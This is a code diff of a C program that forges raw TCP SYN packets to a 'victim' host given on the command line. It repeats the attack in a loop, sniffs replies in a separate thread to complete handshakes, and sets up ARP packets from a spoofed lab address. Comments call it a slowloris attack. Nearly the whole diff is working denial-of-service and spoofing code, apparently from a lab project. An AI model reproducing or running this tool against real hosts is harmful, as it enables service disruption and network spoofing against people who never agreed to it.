@@ -8,13 +8,15 @@
 #include <netdb.h> //NI_MAXHOST, NI_NUMERICHOST
 #include <ifaddrs.h> //getifaddrs func
 #include <time.h>
+#include <signal.h>
 
 #include "handshake.h"
 #include "arpinglib.h"
 
 void hostname_toip(char *dst, struct in_addr *dst_ip);
 char* get_local_ip();
-int start_attack(char *argv[]);
+void start_attack(char *argv[]);
+void send_arp(char *argv[]);
 
 int main(int argc, char *argv[])
 {
@@ -46,31 +48,38 @@ int main(int argc, char *argv[])
     ip_array[1] = argv[1];
     ip_array[2] = argv[2];
     ip_array[3] = argv[3];
-    ip_array[4] = "10.0.0.142";
+    ip_array[4] = "192.168.56.150";
 
-    pthread_t threads[10];
+    int arg_count = 9;
+    //argv[3] is for NIC to use
+    //these parameters have to be specified exactly in this order with -q in front
+    char *args[] = {"-q", "-A", "-I", argv[3], "-q","-c1", "-s", ip_array[4], "192.168.56.101"};
+    //arping_main(arg_count, args);
 
-    for(int i = 0; i < 5; i++)
+    pthread_t thread1;
+
+    ////Creating thread with start_sniffing() function call, will start receiving packets and process them
+    if(pthread_create(&thread1, NULL, (void *) start_sniffing, argv) < 0)
     {
-        if(pthread_create(&threads[i], NULL, (void *) start_attack, ip_array) < 0)
-        {
-            fprintf(stderr, "Failed to create a new thread.\n");
-            return 1;
-        }
-        sleep(3);
-        //printf("Rand num: %d\n", (rand() % 10000));
-        printf("\nThread %d created!\n", i);
-
+        fprintf(stderr, "Failed to create a new thread.\n");
+        return 1;
     }
-    //printf("Syn has been sent out.\n");
-    pthread_join(threads[0], NULL);
-    //send_syn_ack(source_ip, &dst_ip, source_port);
-    //printf("Finished slowloris attack!\n\nValue returned: %d [0 - means success]\nProgram will now close.\n", th1ret);
+
+    for(int i = 0; i < 10; i++)
+    {
+        start_attack(ip_array);
+        printf("Thread %d started.\n", i);
+
+        fflush(stdout);
+    }
+
+    pthread_join(thread1, NULL);
+    //pthread_join(threads[0], NULL);
 
     return 0;
 }
 
-int start_attack(char *argv[])
+void start_attack(char *argv[])
 {
     int sock_raw;
 
@@ -86,46 +95,47 @@ int start_attack(char *argv[])
     //printf("-------------------\n");
 
     //For every time rand func is called, be sure to generate different result
-        //using rand()/srand() in multithreaded app is unsafe
+    //using rand()/srand() in multithreaded app is unsafe
     //srand(time(NULL));
     //I want source ports to be in range 50000-59999
     u_int16_t seq_n = (rand() % 10000);
     u_int16_t source_port = (rand() % 10000) + 50000;
 
-    printf("Seq_n: %u and port: %u\n", seq_n, source_port);
+    //printf("Seq_n: %u and port: %u\n", seq_n, source_port);
     sock_raw = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
 
+    fflush(stdout);
     if(sock_raw < 0)
     {
         perror("Socket error\n");
-        return 1;
+        exit(-1);
     }
     else
     {
-        printf("Socket created.\n");
+        printf("Socket %d created.\n", sock_raw);
     }
 
     char *dst;
     dst = argv[1];
-    printf("Got argv[1]: %s\n", argv[1]);
+    //printf("Got argv[1]: %s\n", argv[1]);
 
     //If hostname (argv[1]) is specified in numbers-and-dots notation, convert to network byte order
     if(inet_addr(dst) != INADDR_NONE)
     {
         //inet_addr converts dst from numbers-dots notaion to network byte order
-        printf("Directly filling dst_ip.\n");
+        //printf("Directly filling dst_ip.\n");
         dst_ip.s_addr = inet_addr(dst);
     }
     else
     {
         //Calls function hostname_toip which translates hostname to IP
-        printf("Calling addrinfo function, with a host: '%s'\n", dst);
+        //printf("Calling addrinfo function, with a host: '%s'\n", dst);
         hostname_toip(dst, &dst_ip);
         //inet_ntoa needs whole in_addr struct
-        printf("Your victim is: %s\n", inet_ntoa(dst_ip));
+        //printf("Your victim is: %s\n", inet_ntoa(dst_ip));
     }
 
-    printf("Local ip is: %s\n", source_ip);
+    //printf("Local ip is: %s\n", source_ip);
 
     //IP header
     struct ip iph;
@@ -139,7 +149,6 @@ int start_attack(char *argv[])
         perror("Could not allocate packet_to_send mem on heap.\n");
         exit(-1);
     }
-
 
     //Zero out the packet memory area
     //memset(packet_to_send, 0, 4096);
@@ -160,8 +169,6 @@ int start_attack(char *argv[])
     iph.ip_sum = csum((unsigned short *) packet_to_send, iph.ip_len >> 1);
 
     memcpy(packet_to_send, &iph, sizeof(iph));
-
-
 
     //Fill in the TCP header
     tcph.th_sport = htons(source_port);
@@ -184,21 +191,11 @@ int start_attack(char *argv[])
     if(setsockopt(sock_raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
     {
         fprintf(stderr, "Error setting up setsockopt!\n");
-        return 1;
+        exit(-1);
     }
 
-    printf("Starting sniffing.\n");
-    //pthread_t thread1;
 
-    ////Creating thread with start_sniffing() function call, will start receiving packets and process them
-    //if(pthread_create(&thread1, NULL, (void *) start_sniffing, argv) < 0)
-    //{
-    //    fprintf(stderr, "Failed to create a new thread.\n");
-    //    return 1;
-    //}
-    sleep(1);
-
-    printf("Starting to send packets.\n");
+    //printf("Starting to send packets.\n");
 
     //dest - sockaddr_in
     memset(&dest, 0, sizeof(dest));
@@ -211,12 +208,7 @@ int start_attack(char *argv[])
         fprintf(stderr, "Error sending syn packet! Error message: %s\n", strerror(errno));
         exit(1);
     }
-    //int arg_count = 7;
-    ////argv[3] is for NIC to use
-    //char *args[] = {"-c1", "-A", "-s", source_ip, "-I", argv[3], "10.0.0.1"};
-    //arping_main(arg_count, args);
-    //return 0;
-}
+    }
 
 void hostname_toip(char *dst, struct in_addr *dst_ip)
 {
@@ -253,7 +245,7 @@ void hostname_toip(char *dst, struct in_addr *dst_ip)
     //printf("Translated as: %s\n", inet_ntoa(*dst_ip));
 }
 
-char* get_local_ip()
+/*char* get_local_ip()
 {
     char *device, errbuff[PCAP_ERRBUF_SIZE];
     bpf_u_int32 net, mask;
@@ -291,4 +283,4 @@ char* get_local_ip()
     }
     return source_ip;
 
-}
+}*/
